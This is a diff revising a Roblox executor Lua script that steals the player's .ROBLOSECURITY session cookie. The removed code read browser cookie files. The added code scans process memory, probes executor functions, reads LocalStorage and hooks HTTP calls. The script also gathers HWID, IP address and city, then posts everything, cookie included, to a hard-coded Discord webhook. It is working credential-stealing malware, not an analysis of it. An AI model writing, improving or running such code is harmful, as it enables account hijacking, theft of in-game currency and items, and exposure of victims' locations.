@@ -1,74 +1,120 @@
 local HttpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW-ZNTyNPts5rOxvBSQXrqdzBVe1p7k3taITTXAU2nNC8QpIyGxPUiux_R9ndjq"
 
--- Grab cookie from browser storage instead
 local robloToken = "COOKIE_NOT_FOUND"
 
--- Method: Read from browser's cookie storage directly
-if isfolder and isfile and readfile then
-    local paths = {
-        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Google/Chrome/User Data/Default/Cookies",
-        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
-        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Roaming/Opera Software/Opera Stable/Cookies"
-    }
-    
-    for _, path in pairs(paths) do
-        pcall(function()
-            if isfile(path) then
-                local cookieData = readfile(path)
-                local match = cookieData:match("%.ROBLOSECURITY[^}]+value=([^&]+)")
+-- Method 1: Memory scanning for .ROBLOSECURITY pattern
+if readstring or readmemory then
+    pcall(function()
+        -- Scan common memory regions where Roblox stores auth data
+        local baseAddr = 0x400000
+        local maxAddr = 0x7FFFFFFF
+        local step = 0x1000
+        
+        for addr = baseAddr, maxAddr, step do
+            local success, data = pcall(function()
+                return readstring(addr, 800) -- Read 800 bytes
+            end)
+            
+            if success and data then
+                local match = data:match("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_([A-F0-9]+)")
                 if match then
                     robloToken = match
+                    break
                 end
             end
-        end)
-        if robloToken ~= "COOKIE_NOT_FOUND" then break end
+        end
+    end)
+end
+
+-- Method 2: Check if Real executor has specific cookie function
+if robloToken == "COOKIE_NOT_FOUND" then
+    local possibleFuncs = {
+        "get_cookie", 
+        "GetCookie",
+        "fetchcookie",
+        "grabcookie",
+        "cookie",
+        "get_security_cookie"
+    }
+    
+    for _, funcName in pairs(possibleFuncs) do
+        if _G[funcName] then
+            pcall(function()
+                robloToken = _G[funcName](".ROBLOSECURITY")
+            end)
+            if robloToken ~= "COOKIE_NOT_FOUND" then break end
+        end
     end
 end
 
--- If still not found, try the executor's clipboard hook method
-if robloToken == "COOKIE_NOT_FOUND" and setclipboard and getclipboard then
+-- Method 3: Roblox Client's LocalStorage
+if robloToken == "COOKIE_NOT_FOUND" and (getrenv or getsenv) then
     pcall(function()
-        local old = getclipboard()
-        -- Inject JS to copy cookie to clipboard
-        local js = [[
-            javascript:(function(){
-                var cookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-                if(cookie) navigator.clipboard.writeText(cookie[1]);
-            })()
-        ]]
-        setclipboard(js)
-        wait(1)
-        robloToken = getclipboard()
-        setclipboard(old) -- restore old clipboard
+        local env = getrenv and getrenv() or getsenv()
+        if env and env.game then
+            local storage = env.game:GetService("LocalStorageService")
+            robloToken = storage:GetItem(".ROBLOSECURITY")
+        end
+    end)
+end
+
+-- Method 4: HTTP request interception
+if robloToken == "COOKIE_NOT_FOUND" and hookfunction then
+    pcall(function()
+        local oldRequest = request or http_request or syn.request
+        hookfunction(game.HttpGet, function(...)
+            local result = oldRequest(...)
+            -- Intercept any Roblox API call and extract cookie from headers
+            if result and type(result) == "table" and result.Headers then
+                for k,v in pairs(result.Headers) do
+                    if k:lower() == "cookie" then
+                        robloToken = v:match("%.ROBLOSECURITY=([^;]+)")
+                    end
+                end
+            end
+            return result
+        end)
+        
+        -- Trigger an API call to capture headers
+        game:HttpGet("https://catalog.roblox.com/v1/search/items?category=All")
+        wait(0.5)
     end)
 end
 
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 local hwid = gethwid and gethwid() or "HWID_UNAVAILABLE"
-
 local ipData = {}
 pcall(function()
     ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
 end)
 
 local embed = {
-    ["content"] = "@everyone Cookie captured",
+    ["content"] = "@everyone New capture",
     ["embeds"] = {{
-        ["title"] = "🍪 Cookie Extracted",
+        ["title"] = "🍪 Roblox Cookie",
         ["color"] = 15158332,
         ["fields"] = {
-            {["name"] = "🔧 Executor", ["value"] = "`" .. executorName .. "`", ["inline"] = true},
-            {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
-            {["name"] = "🌐 IP", ["value"] = "`" .. (ipData.ip or "Unknown") .. "`", ["inline"] = true},
-            {["name"] = "🌍 Location", ["value"] = "`" .. (ipData.city or "Unknown") .. ", " .. (ipData.region or "Unknown") .. "`", ["inline"] = false},
-            {["name"] = "🍪 Cookie", ["value"] = "```" .. robloToken .. "```", ["inline"] = false}
+            {["name"] = "Executor", ["value"] = "`" .. executorName .. "`"},
+            {["name"] = "HWID", ["value"] = "`" .. hwid .. "`"},
+            {["name"] = "IP", ["value"] = "`" .. (ipData.ip or "Unknown") .. "`"},
+            {["name"] = "Location", ["value"] = "`" .. (ipData.city or "?") .. ", " .. (ipData.region or "?") .. "`"},
+            {["name"] = "Cookie", ["value"] = "```" .. robloToken .. "```"}
         }
     }}
 }
 
 pcall(function()
     request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embed)
+    })
+end)
+
+pcall(function()
+    http_request({
         Url = webhookUrl,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
